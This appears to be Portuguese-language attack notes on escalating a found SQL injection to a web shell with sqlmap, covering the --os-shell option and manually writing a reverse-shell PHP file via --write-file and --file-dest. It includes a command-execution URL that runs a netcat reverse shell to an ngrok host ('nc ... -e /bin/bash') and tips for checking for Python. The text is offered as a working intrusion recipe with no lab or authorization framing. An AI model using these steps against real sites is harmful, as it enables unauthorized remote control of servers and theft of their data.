O SQL MAP ALÉM DO SQL INJECTION TEM UMA FUNÇÃO INTERESSANTE QUE PODE OCORRER EM ALGUNS CASOS QUE
É CONSEGUIR UMA WEB SHELL, E HÁ DUAS MANEIRAS DE TENTAR FAZER ISSO, APÓS DESCOBRIR UMA INJEÇÃO SQL

	1.USANDO O PARÂMETRO --OS-SHELL
	
		1.APÓS ENCONTRAR A VULNERABILIDADE SQL INJECTION, PODE SE 
		USAR O PARÂMETRO --os-shell, QUE ELE SERVE PARA INJETAR
		UM ARQUIVO E OBTER UMA SHELL.
			
			COMANDO: sqlmap -r requisicao.txt --os-shell
			
		2.APÓS ISSO IRÁ FAZER PERGUNTAS COMO QUAL O TIPO DE 
		LINGUAGEM ESTÁ RODANDO, GERALMENTE OCORRE DE SER PHP,
		MAS SE INFORME PARA ESCOLHER A OPÇÃO CERTA.
		
		3.DEPOIS DISSO IRÁ PERGUNTAR O DIRETÓRIO DA APLICAÇÃO,
		CASO TENHA O DIRETÓRIO COLOQUE EM CUSTOM LOCATION,
		CASO NÃO TENHA ESCOLHA A OPÇÃO BRUTE FORCE SEARCH.
		
		4.APÓS ISSO SE TUDO DER CERTO SERÁ OBTIDO UMA SHELL.
		
	
	2.CRIANDO MANUALMENTE A SHELL.
	
		1.ABRA A PORTA PELO NETCAT
		
		2.TUNELAR A PORTA PELO NGROK
		
		3.CRIE UM ARQUIVO COM UM CÓDIGO DE SHELL
		REVERSA DE ACORDO COM A LINGUAGEM QUE RODA 
		NA PÁGINA E VOCÊ TAMBÉM TERÁ QUE SABER ONDE 
		ESTÁ O DIRETÓRIO DA APLICAÇÃO.
		
		4.RODAR O COMANDO DO SQLMAP COM OS PARÂMETROS WRITE FILE E 
		FILE DEST.
			
			COMANDO: sqlmap -r <requisicao.txt> --write-file=<shell.php> --file-dest=<diretorio>
			
			EX: COMANDO: sqlmap -r requisicao.txt --write-file=shell.php --file-dest=var/www/html
			
		5.APÓS ISSO SE TUDO DER CERTO, OBTERÁ
		A SHELL.
		
		
		EXTRA: 
		
		1.CASO NÃO DE CERTO COM A REVERSE SHELL MANUALMENTE, 
		NO LUGAR DA REVERSE SHELL, CRIE UM ARQUIVO QUE TENHA UM PARÂMETRO
		QUE CONSIGA EXECUTAR COMANDOS.
			
			NA PASTA TERÁ UM SCRIPT PHP DE EXEMPLO DE COMO SERÁ FEITO
			O ARQUIVO COM PARÂMETRO PARA COMANDOS.
		
		
		2.MANDE PARA A PÁGINA DA MESMA FORMA QUE ENVIARIA A REVERSE SHELL
		MANUALMENTE
			
		3.APARTIR DISSO TENTE ABRIR O ARQUIVO NA PÁGINA USANDO
		/<nome_do_arquivo>?<param_executavel> 
		
			EX: https://seusite.com/shell.php?cmd=
		
		4.APARTIR DELE FAÇA O COMANDO PARA FAZER A REVERSE SHELL.
			
			EX:  https://seusite.com/shell.php?cmd=nc 0.tcp.sa.ngrok.io 43724 -e /bin/bash
			
			OU USANDO UMA PAYLOAD DE SHELL REVERSA EM PYTHON, CASO TENHA ELE
			NO SITE.
			
			
		EXTRA: PARA SABER SE TEM A FERRAMENTA NETCAT OU PYTHON NO APLICATIVO, USE
		NA PARTE DO COMANDO, O COMANDO WHICH.
			
			EX: https://seusite.com/shell.php?cmd=which python3
